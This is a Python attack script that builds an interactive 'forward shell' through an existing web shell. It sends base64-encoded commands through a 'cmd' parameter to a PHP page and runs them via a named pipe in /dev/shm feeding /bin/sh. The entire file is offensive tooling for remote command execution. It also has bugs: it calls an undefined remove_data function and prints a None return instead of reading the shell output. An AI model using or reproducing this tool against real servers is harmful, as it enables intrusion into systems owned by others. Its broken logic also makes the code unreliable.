#!/usr/bin/env python3

import requests
from termcolor import colored
import signal
import sys
from base64 import b64encode
from random import randrange
import time


def close_application(sig, frame):
    print(colored("[!] Closing application...", "red"))
    remove_data()
    sys.exit(1)

signal.signal(signal.SIGINT, close_application)



class ForwardShell:
    
    def __init__(self):
        session = randrange(1000, 9999)
        self.main_url = "http://localhost/index.php"
        self.stdin = f"/dev/shm/{session}.input"
        self.stdout = f"/dev/shm/{session}.output"
    
    def setup_shell(self):
        command = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.run_command(command)
    
    def write_stdin(self, command):
        command = b64encode(command.encode()).decode()
        data = {"cmd": 'echo "%s" | base64 -d > %s' % (command, self.stdin)}
        requests.get(self.main_url, params=data)
    
    def read_stdout(self):
        for _ in range(5):
            command = f"/bin/cat {self.stdout}"
            output = self.run_command(command)
            time.sleep(0.2)
        return output
    
    def run_command(self, command):
        command = b64encode(command.encode()).decode()
    
        data = {"cmd": 'echo "%s" | base64 -d | /bin/sh' % command}
        
        try:
            response = requests.get(self.main_url, params=data, timeout=5)
            return response.text
        except:
            pass
        return None
    
    def clear_stdout(self):
        command = "echo '' > %s" % self.stdout
        self.run_command(command)

    def run(self):
        self.setup_shell()
    
        while True:
            command = input(colored("Shell> ", "yellow"))
            command_output = self.write_stdin(command + "\n")
            print(command_output)
            self.clear_stdout()


if __name__ == "__main__":
    forwardshell = ForwardShell()
    forwardshell.run()